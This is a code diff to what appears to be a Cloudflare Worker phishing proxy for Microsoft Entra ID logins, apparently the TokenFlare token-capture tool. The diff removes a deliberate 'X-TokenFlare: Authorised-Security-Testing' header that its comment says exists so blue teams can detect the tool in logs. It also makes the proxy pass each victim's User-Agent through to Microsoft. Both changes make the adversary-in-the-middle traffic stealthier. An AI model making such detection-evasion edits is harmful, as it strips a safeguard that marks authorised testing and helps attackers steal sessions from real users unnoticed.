@@ -38,7 +38,7 @@ const DEFAULTS = {
 
 export default {
   async fetch(request, env) {
-    const cfg = loadConfig(env);
+    const cfg = loadConfig(env, request);
     const log = makeLogger(cfg.debug);
 
     // 1) preFlight blocks & checks
@@ -211,8 +211,6 @@ function makeProxyHeaders(origHeaders, upstreamHost, refererOrigin, userAgentStr
   if (userAgentString !== '') {
       h.set('User-Agent', userAgentString);
   }
-  // Intentional IoC for blue team detection in Entra ID logs
-  h.set('X-TokenFlare', 'Authorised-Security-Testing');
   return h;
 }
 
@@ -296,7 +294,7 @@ function getSetCookies(headers) {
 /// ─────────────────────────────────────────────────────────────
 
 /** Read runtime config from env with safe fallbacks. */
-function loadConfig(env) {
+function loadConfig(env, request) {
 
     let upstreamPath = env.UPSTREAM_PATH || DEFAULTS.upstreamPath;
     // if someone set a client tenant in wrangler file, we rewrite the first URL they would (i.e. first upstream path)
@@ -328,7 +326,7 @@ function loadConfig(env) {
     // client settings
     clientTenant: clientTenant,
     // custom UA to send MS, defaults to proxying the user's UA
-    userAgentString: env.CUSTOM_USER_AGENT || DEFAULTS.userAgentString,
+    userAgentString: env.CUSTOM_USER_AGENT || request.headers.get('User-Agent') || DEFAULTS.userAgentString,
     // debugging & notification
     debug: env.DEBUGGING || DEFAULTS.debug,
     // redirect URI, generated from UPSTREAM_PATH
